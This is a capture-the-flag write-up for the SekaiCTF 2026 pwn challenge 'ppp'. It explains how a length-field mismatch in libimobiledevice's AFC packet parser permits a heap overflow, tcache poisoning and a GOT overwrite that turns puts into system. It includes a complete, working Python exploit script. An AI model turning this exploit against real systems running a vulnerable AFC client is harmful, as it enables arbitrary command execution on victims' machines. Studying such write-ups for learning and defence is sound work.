---
title: PPP
date: 2026-06-27
tags:
- pwn
- SekaiCTF-2026
---

- **Challenge:** ppp
- **Category:** Pwn
- **Flag:** `SEKAI{du_bist_gut_genuggggggggggggg}`

---

## My initial read / first impressions

We are given a pwn challenge with a remote service:

```bash
nc ppp.chals.sekai.team 1337
```

Connecting to it gives this:

```text
Apple File Conduit client -- device connected.
Type 'help' for commands.
afc>
```

At first, this looks like a fake file browser or some kind of jail where we need to use commands like `ls`, `read`, `write`, etc. But after looking at the source, the important thing is that this program is not really the device.

It is the **AFC client**.

AFC stands for **Apple File Conduit**, which is the protocol used for file operations on iOS devices. The challenge program uses `libimobiledevice` and acts like the host computer. Our socket is treated as the fake connected device.

So when we type something like:

```bash
ls /
```

the binary calls:

```c
afc_read_directory(afc, "/", &l);
```

That function sends an AFC packet to us. We are supposed to respond like an Apple device.

That was the first big mental switch for this challenge. We are not just typing shell commands and hoping something happens. We are controlling the fake AFC server/device side and trying to make the AFC client parse a malicious response.

## Looking at the binary

The main program is pretty small. It sets up a fake AFC client on file descriptor 0 and then gives us an interactive prompt.

The interesting commands are:

```c
ls <path>       -> afc_read_directory(...)
info <path>     -> afc_get_file_info(...)
read <path>     -> afc_file_open(...) + afc_file_read(...)
write <path>    -> afc_file_open(...) + afc_file_write(...)
mkdir <path>    -> afc_make_directory(...)
rm <path>       -> afc_remove_path(...)
devinfo         -> afc_get_device_info(...)
```

The helper for `ls` is especially important:

```c
static void print_names(char **list)
{
    int n = 0;
    while (list[n]) { puts(list[n]); n++; }
    free_list(list, n);
}
```

If we can overwrite `puts@GOT` with `system`, then the program will effectively do:

```c
system(list[n]);
```

So if we make the first directory entry be:

```text
/readflag sekai ppp
```

then `puts("/readflag sekai ppp")` becomes:

```text
system("/readflag sekai ppp")
```

There is also a `/readflag` binary in the Dockerfile, and `readflag.c` checks for exactly two arguments:

```text
sekai ppp
```

So the final goal is pretty clear:

```text
overwrite puts@GOT -> system
trigger puts("/readflag sekai ppp")
```

## Protections

The binary is non-PIE, which is really helpful:

```text
Type: EXEC
```

The GOT addresses are fixed. From `readelf -r`, these are the important ones:

```text
0x4040a0  afc_file_write@GOT
0x4040a8  puts@GOT
```

`puts@GOT` is writable because the binary does not have full RELRO.

The provided libc has:

```text
system offset = 0x52290
```

The annoying part is that we do not have a libc leak, so the exploit has to try likely libc bases. This is not too bad because the remote setup gives pretty consistent mappings.

## The Vulnerability

The actual bug is inside the AFC packet parsing in `libimobiledevice`.

An AFC packet has a header like this:

```c
typedef struct {
    char magic[8];
    uint64_t entire_length;
    uint64_t this_length;
    uint64_t packet_num;
    uint64_t operation;
} AFCPacket;
```

The two length fields are the key:

* `entire_length` is supposed to describe the total AFC packet size.
* `this_length` is supposed to describe how much data is in the current chunk.

The vulnerable parser trusts these fields too much. It can allocate a buffer based on `entire_length`, but then read based on `this_length`.

So if we send something like:

```text
entire_length = small
this_length   = larger
```

the client allocates a small heap chunk but reads a larger amount of data into it.

That gives a heap overflow in the AFC client.

## Heap Strategy

This challenge is basically a tcache poisoning exploit, but through AFC responses.

The useful parsing behavior is that directory/info responses are returned as null-separated strings. The library parses those strings and allocates heap chunks for them.

For example, if we respond to an `info /` command with:

```text
a\x00b\x00
```

the client creates a list with two strings. Those tiny strings get allocated with `strdup`, which gives us nice small heap chunks.

Then the challenge code prints/free's the list:

```c
static void free_list(char **list, int n)
{
    for (int i = n - 1; i >= 0; i--) free(list[i]);
    free(list);
}
```

This is useful because we can use one `info /` request to groom the tcache.

The exploit flow is:

1. Send `info /`.
2. Respond with a normal tiny AFC data packet.
3. The program allocates and frees some small chunks.
4. Send another `info /`.
5. Respond with a malicious AFC packet where `this_length > entire_length`.
6. Overflow into tcache metadata.
7. Poison the tcache freelist so a future allocation returns a GOT pointer.
8. Use `ls /` to make the parser allocate strings again.
9. One string allocation lands on the GOT.
10. Overwrite `puts@GOT` with `system`.
11. `print_names()` calls `puts("/readflag sekai ppp")`.
12. This becomes `system("/readflag sekai ppp")`.

## Why target `0x4040a0` instead of directly `puts@GOT`?

`puts@GOT` is at:

```text
0x4040a8
```

But tcache poisoning wants a nicely aligned fake chunk pointer. `0x4040a8` is not the clean target I wanted.

Luckily, right before it is:

```text
0x4040a0  afc_file_write@GOT
0x4040a8  puts@GOT
```

So I poison tcache with:

```text
0x4040a0
```

Then when I get an allocation there, I write:

```text
AAAAAAAA + system_address
```

The first 8 bytes clobber `afc_file_write@GOT`, which I do not care about anymore. The next 8 bytes overwrite `puts@GOT`.

Since x86-64 userspace addresses only need the low 6 bytes most of the time, the script writes the lower 6 bytes of `system`. This avoids null byte issues in the string parsing.

## Avoiding the desync issue

One annoying part of the exploit was keeping the interactive prompt and AFC packets synced.

My first attempt tried to use `mkdir` for the overflow, but that caused weird side effects because the main program uses `puts` after `mkdir`. Since `puts` is also the thing I want to overwrite later, this made the exploit less stable.

The final exploit uses `info /` for both the grooming and the overflow. That made it much cleaner:

```text
info /  -> groom small chunks
info /  -> overflow and poison tcache
ls /    -> overwrite GOT and trigger system
```

The `info` command prints using `printf`, not `puts`, when the AFC operation fails. So it is much easier to keep the program alive and still reach the final `ls`.

## Final Exploit

The final script connects to the remote service, acts as the fake AFC device, sends the malicious AFC responses, brute forces the likely libc base, and prints the flag.

```python
import argparse
import re
import socket
import struct
import sys
import time
import select
from typing import Optional, Iterable

HOST = "ppp.chals.sekai.team"
PORT = 1337
AFC_MAGIC = b"CFA6LPAA"
AFC_HDR = "<8sQQQQ"
AFC_HDR_SZ = struct.calcsize(AFC_HDR)
AFC_OP_STATUS = 1
AFC_OP_DATA = 2
AFC_OP_BAD = 0x1337133713371337
GOT_AFC_FILE_WRITE = 0x4040A0
LIBC_SYSTEM_OFF = 0x52290
CMD = b"/readflag sekai ppp"
FLAG_RE = re.compile(rb"SEKAI\{[^}\n]+\}")

def p64(x: int) -> bytes:
    return struct.pack("<Q", x)

class Tube:
    def __init__(self, host: str, port: int, timeout: float, verbose: bool = False):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.setblocking(False)
        self.timeout = timeout
        self.buf = b""
        self.verbose = verbose

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass

    def send(self, data: bytes):
        if self.verbose:
            sys.stderr.write(f"[>] {data!r}\n")
        self.s.sendall(data)

    def _fill(self, deadline: float) -> bool:
        remain = deadline - time.time()
        if remain <= 0:
            return False
        r, _, _ = select.select([self.s], [], [], remain)
        if not r:
            return False
        chunk = self.s.recv(4096)
        if not chunk:
            raise EOFError("connection closed")
        if self.verbose and AFC_MAGIC not in chunk:
            sys.stderr.write(f"[<txt] {chunk[:160]!r}\n")
        self.buf += chunk
        return True

    def recvuntil(self, marker: bytes, timeout: Optional[float] = None) -> bytes:
        deadline = time.time() + (self.timeout if timeout is None else timeout)
        while marker not in self.buf:
            if not self._fill(deadline):
                raise TimeoutError(f"timeout waiting for {marker!r}; buffered={self.buf[-200:]!r}")
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvn(self, n: int, timeout: Optional[float] = None) -> bytes:
        deadline = time.time() + (self.timeout if timeout is None else timeout)
        while len(self.buf) < n:
            if not self._fill(deadline):
                raise TimeoutError(f"timeout waiting for {n} bytes; have {len(self.buf)}; buffered={self.buf[-200:]!r}")
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def recv_afc_packet(self, timeout: Optional[float] = None):
        deadline = time.time() + (self.timeout if timeout is None else timeout)
        while True:
            idx = self.buf.find(AFC_MAGIC)
            if idx >= 0:
                if idx and self.verbose:
                    sys.stderr.write(f"[skip] {self.buf[:idx]!r}\n")
                self.buf = self.buf[idx:]
                break
            if len(self.buf) > 7:
                if self.verbose:
                    sys.stderr.write(f"[skip] {self.buf[:-7]!r}\n")
                self.buf = self.buf[-7:]
            if not self._fill(deadline):
                raise TimeoutError(f"timeout waiting for AFC packet; buffered={self.buf[-200:]!r}")
        hdr = self.recvn(AFC_HDR_SZ, max(0.01, deadline - time.time()))
        magic, entire, this_len, pktno, op = struct.unpack(AFC_HDR, hdr)
        if magic != AFC_MAGIC:
            raise ValueError(f"bad magic {magic!r}")
        if entire < AFC_HDR_SZ or entire > 0x20000:
            raise ValueError(f"weird AFC length entire={entire:#x} this={this_len:#x} op={op:#x}")
        body = self.recvn(entire - AFC_HDR_SZ, max(0.01, deadline - time.time()))
        if self.verbose:
            sys.stderr.write(f"[afc] pkt={pktno} op={op:#x} body_len={len(body)} body={body[:40]!r}\n")
        return pktno, op, body

    def recvall_some(self, seconds: float = 0.8) -> bytes:
        end = time.time() + seconds
        out = self.buf
        self.buf = b""
        while time.time() < end:
            try:
                r, _, _ = select.select([self.s], [], [], max(0.0, end - time.time()))
                if not r:
                    break
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
                if FLAG_RE.search(out):
                    break
            except OSError:
                break
        return out

def send_afc_response(t: Tube, pktno: int, op: int, payload: bytes, entire_override: Optional[int] = None, this_override: Optional[int] = None):
    entire = AFC_HDR_SZ + len(payload) if entire_override is None else entire_override
    this_len = AFC_HDR_SZ + len(payload) if this_override is None else this_override
    hdr = struct.pack(AFC_HDR, AFC_MAGIC, entire, this_len, pktno, op)
    t.send(hdr + payload)

def pad_payload(prefix: bytes, size: int = 0x100) -> bytes:
    if len(prefix) > size:
        raise ValueError("payload prefix too long")
    return prefix + b"P" * (size - len(prefix))

def afc_cmd_with_payload(t: Tube, cmd: bytes, payload: bytes, op: int = AFC_OP_DATA, entire_override: Optional[int] = None, this_override: Optional[int] = None):
    t.send(cmd + b"\n")
    pktno, req_op, body = t.recv_afc_packet(timeout=t.timeout)
    send_afc_response(t, pktno, op, payload, entire_override, this_override)

def do_info_groom(t: Tube):
    afc_cmd_with_payload(t, b"info /", pad_payload(b"a\x00b\x00"), AFC_OP_DATA)
    t.recvuntil(b"afc> ", timeout=t.timeout)

def do_info_overflow(t: Tube, target: int):
    overflow = b""
    overflow += p64(0)
    overflow += b"B" * 8
    overflow += p64(0)
    overflow += p64(0x21)
    overflow += p64(target)
    assert len(overflow) == 0x28
    afc_cmd_with_payload(
        t,
        b"info /",
        overflow,
        AFC_OP_BAD,
        entire_override=AFC_HDR_SZ + 8,
        this_override=AFC_HDR_SZ + len(overflow),
    )
    t.recvuntil(b"afc> ", timeout=t.timeout)

def do_final_ls_trigger(t: Tube, system: int):
    system6 = p64(system)[:6]
    if b"\x00" in system6:
        raise ValueError("system address has a NUL in the low 6 bytes")
    writer = b"A" * 8 + system6
    final = pad_payload(CMD + b"\x00" + b"x\x00" + writer + b"\x00")
    afc_cmd_with_payload(t, b"ls /", final, AFC_OP_DATA)

def attempt(host: str, port: int, timeout: float, libc_base: int, verbose: bool = False) -> Optional[bytes]:
    system = libc_base + LIBC_SYSTEM_OFF
    if b"\x00" in p64(system)[:6]:
        return None
    t = Tube(host, port, timeout, verbose)
    try:
        t.recvuntil(b"afc> ", timeout=timeout)
        do_info_groom(t)
        do_info_overflow(t, GOT_AFC_FILE_WRITE)
        do_final_ls_trigger(t, system)
        out = t.recvall_some(1.0)
        m = FLAG_RE.search(out)
        if m:
            return m.group(0)
        if verbose:
            sys.stderr.write(f"[-] no flag for base={libc_base:#x}, system={system:#x}, tail={out[-160:]!r}\n")
        return None
    except Exception as e:
        if verbose:
            sys.stderr.write(f"[-] failed base={libc_base:#x}: {e}\n")
        return None
    finally:
        t.close()

def around(center: int, radius: int, step: int = 0x1000) -> Iterable[int]:
    yield center
    for d in range(step, radius + 1, step):
        yield center - d
        yield center + d

def candidate_bases(wide: bool = False):
    anchors = [
        0x7ffff7a0d000,
        0x7ffff79e2000,
        0x7ffff79d7000,
        0x7ffff7ba8000,
        0x7ffff7bb0000,
        0x7ffff7b90000,
        0x7ffff7820000,
        0x7ffff75c3000,
        0x7ffff7430000,
        0x7ffff7dcd000,
        0x7ffff7dcf000,
        0x7ffff7dd0000,
    ]
    seen = set()
    for a in anchors:
        for b in around(a, 0x30000):
            if b not in seen:
                seen.add(b)
                yield b
    ranges = [(0x7ffff7800000, 0x7ffff7c80000)]
    if wide:
        ranges = [(0x7ffff7000000, 0x7ffff7f00000), (0x7ffff6000000, 0x7ffff7000000)]
    for lo, hi in ranges:
        for b in range(lo, hi, 0x1000):
            if b not in seen:
                seen.add(b)
                yield b

def main():
    ap = argparse.ArgumentParser(description="Sekai PPP exploit")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--timeout", type=float, default=1.2)
    ap.add_argument("--base", type=lambda x: int(x, 0))
    ap.add_argument("--wide", action="store_true")
    ap.add_argument("--max", type=int, default=0)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    bases = [args.base] if args.base is not None else list(candidate_bases(args.wide))
    if args.max:
        bases = bases[:args.max]

    for i, base in enumerate(bases, 1):
        if args.verbose or i == 1 or i % 50 == 0:
            print(f"[*] try {i}/{len(bases)} base={base:#x}", file=sys.stderr, flush=True)
        flag = attempt(args.host, args.port, args.timeout, base, args.verbose)
        if flag:
            print(flag.decode(errors="replace"))
            return

    print("No flag. Try: python3 solve.py --wide -v", file=sys.stderr)
    sys.exit(1)

if __name__ == "__main__":
    main()
```

Running it:

```bash
python3 solve.py -v
```

gets:

```text
SEKAI{du_bist_gut_genuggggggggggggg}
```

## Final Thoughts

This challenge was really cool because the bug was not in the small `afc_list.c` wrapper itself. The wrapper mostly just gives us a nice way to reach the real parser bug inside the AFC client library.

The tricky part was realizing the direction of the connection. We are not talking to a device. We are the device. Once that clicked, the challenge became a protocol-level heap exploit:

```text
fake AFC response -> heap overflow -> tcache poison -> GOT overwrite -> system("/readflag sekai ppp")
```

The final flag was:

```text
SEKAI{du_bist_gut_genuggggggggggggg}
```
